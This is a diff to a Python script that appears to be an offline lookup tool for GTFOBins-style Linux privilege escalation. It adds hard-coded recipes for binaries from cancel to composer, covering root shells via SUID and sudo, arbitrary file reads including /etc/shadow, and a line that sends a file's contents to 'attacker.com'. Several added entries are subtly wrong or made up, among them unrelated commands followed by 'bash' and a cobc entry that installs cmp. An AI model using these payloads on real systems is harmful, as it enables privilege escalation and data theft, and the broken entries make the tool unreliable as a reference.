@@ -7,7 +7,7 @@ def print_logo():
 O   O  F      F      G       R   R   I   D   D 
 O   O  FFFF   FFFF   G  GG   RRRR    I   D   D 
 O   O  F      F      G   G   R  R    I   D   D 
- OOO   F      F       GGG    R   R   III  DDDD  
+ OOO   F      F       GGG    R   R  III  DDDD  
     '''
     print(logo)
 #Function for gtfo_bins that will hold the different commands and responses
@@ -687,6 +687,246 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "file-read":
             bins.append("cabal build\ncabal run")
 
+    elif zip_command == "cancel":
+        if zip_options == "file-write":
+            bins.append("RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT")
+        elif zip_options == "file-read":
+            bins.append("Not available")
+        elif zip_options == "Shell":
+            bins.append("Not available")
+        elif zip_options == "suid":
+            bins.append("Not available")
+        elif zip_options == "sudo":
+            bins.append("Not available")
+
+    elif zip_command == "capsh":
+        if zip_options == "Shell":
+            bins.append("capsh --")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which capsh) .\n./capsh --gid=0 --uid=0 --")
+        elif zip_options == "sudo":
+            bins.append("sudo capsh --")
+        elif zip_options == "file-read":
+            bins.append("sudo setcap cap_dac_read_search=eip /path/to/binary")
+        elif zip_options == "file-write":
+            bins.append("capsh --caps=""cap_dac_write=eip"" -- -c ""command_to_run""")
+
+    elif zip_command == "cdist":
+        if zip_options == "Shell":
+            bins.append("cdist shell -s /bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo cdist shell -s /bin/sh")
+        elif zip_options == "suid":
+            bins.append("username ALL=(ALL) NOPASSWD: /usr/bin/cdist")
+        elif zip_options == "file-read":
+            bins.append("setcap cap_dac_read_search=eip /usr/bin/cdist")
+        elif zip_options == "file-write":
+            bins.append("getcap /usr/bin/cdist")
+
+    elif zip_command == "certbot":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
+        elif zip_options == "sudo":
+            bins.append("TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which certbot) .\nTF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
+        elif zip_options == "file-write":
+            bins.append("sudo certbot renew")
+        elif zip_options == "file-read":
+            bins.append("sudo -u certbot-user certbot renew --dry-run")
+    
+    elif zip_command == "check_by_ssh":
+        if zip_options == "Shell":
+            bins.append("check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
+        elif zip_options == "sudo":
+            bins.append("sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_by_ssh) .\ncheck_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
+        elif zip_options == "file-write":
+            bins.append("echo ""Test message"" >> /var/log/nagios/check_by_ssh.log")
+        elif zip_options == "file-read":
+            bins.append("cat ""FILE"" /var/log/nagios/check_by_ssh.log")
+
+    elif zip_command == "check_cups":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncheck_cups --extra-opts=@$LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_cups) .\nLFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
+        elif zip_options == "Shell":
+            bins.append("echo ""check_cups -H localhost -p 9100"" > rvshell.sh\nbash")
+
+    elif zip_command == "check_log":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_log) .\nLFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
+        elif zip_options == "Shell":
+            bins.append("/usr/local/nagios/libexec/check_log -f /var/log/syslog -q ""error"" -w 10 -c 20\nbash")
+
+    elif zip_command == "check_memory":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncheck_memory --extra-opts=@$LFILE")
+        elif zip_options == "Shell":
+            bins.append("/usr/local/nagios/libexec/check_memory -w 80 -c 90\nbash")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_memory) .")
+
+    elif zip_command == "check_raid":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncheck_raid --extra-opts=@$LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_raid) .\nLFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
+        elif zip_options == "Shell":
+            bins.append("/usr/local/nagios/libexec/check_raid -w 80 -c 90\nbash")
+
+    elif zip_command == "check_ssl_cert":
+        if zip_options == "sudo":
+            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
+        elif zip_options == "file-read":
+            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
+        elif zip_options == "file-write":
+            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\n./$OUTPUT")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_ssl_cert) .\nCOMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
+        elif zip_options == "Shell":
+            bins.append("/usr/local/nagios/libexec/check_ssl_cert -H example.com -w 30 -c 15\nbash")
+
+    elif zip_command == "check_statusfile":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo check_statusfile $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncheck_statusfile $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncheck_statusfile $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which check_statusfile) .\nLFILE=file_to_read\ncheck_statusfile $LFILE")
+        elif zip_options == "Shell":
+            bins.append("/usr/local/nagios/libexec/check_statusfile -H example.com -w 30 -c 15\nbash")
+
+    elif zip_command == "choom":
+        if zip_options == "sudo":
+            bins.append("sudo choom -n 0 /bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which choom) .\n./choom -n 0 -- /bin/sh -p")
+        elif zip_options == "Shell":
+            bins.append("choom -n 0 /bin/sh")
+        elif zip_options == "file-read":
+            bins.append("choom -p <pid> --set <priority_level>\n cat FILE")
+        elif zip_options == "file-write":
+            bins.append("choom -p <pid> --set <priority_level>\n echo 'text' > FILE")
+
+    elif zip_command == "chown":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE")
+        elif zip_options == "suid":
+            bins.append("LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE")
+        elif zip_options == "file-read":
+            bins.append("chown user:group file.txt")
+        elif zip_options == "file-write":
+            bins.append("chmod u=rw,g=r,o= file.txt")
+        elif zip_options == "Shell":
+            bins.append("bash -c ""chown user:group /path/to/file && exec bash""")
+
+    elif zip_command == "chroot":
+        if zip_options == "sudo":
+            bins.append("sudo chroot /")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which chroot) .\n./chroot / /bin/sh -p")
+        elif zip_options == "file-read":
+            bins.append("mkdir /newroot\ncp /bin/bash /newroot/bin/\ncp /lib/x86_64-linux-gnu/libc.so.6 /newroot/lib/x86_64-linux-gnu/\nchroot /newroot /bin/bash")
+        elif zip_options == "file-write":
+            bins.append("mkdir -p /newroot/var/log\ntouch /newroot/var/log/mylogfile.log\nchmod 666 /newroot/var/log/mylogfile.log\nchroot /newroot /bin/bash\necho ""Log entry at $(date)"" >> /var/log/mylogfile.log")
+        elif zip_options == "Shell":
+            bins.append("chroot <new_root_directory> /bin/bash")
+
+    elif zip_command == "clamscan":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which clamscan) .\nLFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
+        elif zip_options == "Shell":
+            bins.append("clamscan -r /path/to/directory")
+
+    elif zip_command == "cmp":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cmp) .\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncmp $LFILE /dev/zero -b -l")
+        elif zip_options == "Shell":
+            bins.append("./compare_files.sh file1.txt file2.txt\ncmp -s file1.txt file2.txt")
+
+    elif zip_command == "cobc":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x")
+        elif zip_options == "sudo":
+            bins.append("TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cmp) .\nTF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
+        elif zip_options == "file-read":
+            bins.append("cobc -x /path/to/file/fileread.cob")
+        elif zip_options == "file-write":
+            bins.append("cobc -x /path/to/file/fileread.cob")
+
+    elif zip_command == "column":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo column $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which column) .\nLFILE=file_to_read\n./column $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncolumn $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncolumn $LFILE")
+        elif zip_options == "Shell":
+            bins.append("LFILE=file_to_read\ncolumn /etc/shadow")
+
+    elif zip_command == "comm":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which comm) .\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncomm $LFILE /dev/null 2>/dev/null")
+        elif zip_options == "Shell":
+            bins.append("comm <(sort file1.txt) <(sort file2.txt)")
+
+    elif zip_command == "composer":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
+        elif zip_options == "sudo":
+            bins.append("TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which composer) .\nTF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
+        elif zip_options == "file-read":
+            bins.append("composer init\nphp file-reader.php")
+        elif zip_options == "file-write":
+            bins.append("composer init\nphp file-writer.php")
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
@@ -702,7 +942,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
